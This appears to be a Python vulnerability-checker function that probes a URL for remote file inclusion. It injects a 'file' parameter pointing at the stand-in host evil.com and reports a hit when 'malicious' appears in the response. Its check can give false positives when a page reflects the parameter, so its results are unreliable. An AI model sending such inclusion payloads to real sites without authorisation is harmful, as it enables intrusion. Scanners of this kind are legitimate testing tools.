import requests

def is_remote_file_inclusion_vulnerable(url):
    """
    Checks if the application is vulnerable to Remote File Inclusion (RFI) by attempting to include an external resource.

    Parameters:
    - url (str): The target URL to check for RFI vulnerability (should include a query parameter like `?file=`).

    Returns:
    - bool: True if vulnerable to RFI, otherwise False.
    """
    # Validate URL input
    if not isinstance(url, str) or not url.startswith("http"):
        raise ValueError("Invalid URL. Ensure the URL starts with 'http' or 'https'.")

    # Test payload URL with malicious file inclusion attempt
    test_url = f"{url}?file=http://evil.com/malicious.txt"
    
    try:
        # Send GET request to the target with malicious file inclusion URL
        response = requests.get(test_url, timeout=5)

        # Check if "malicious" text appears in the response, indicating RFI vulnerability
        if response.status_code == 200 and "malicious" in response.text.lower():
            print("RFI vulnerability detected: malicious content loaded.")
            return True
        return False
    except requests.RequestException as e:
        # Handle connection errors and other issues with the request
        print(f"Error while testing RFI: {e}")
        return False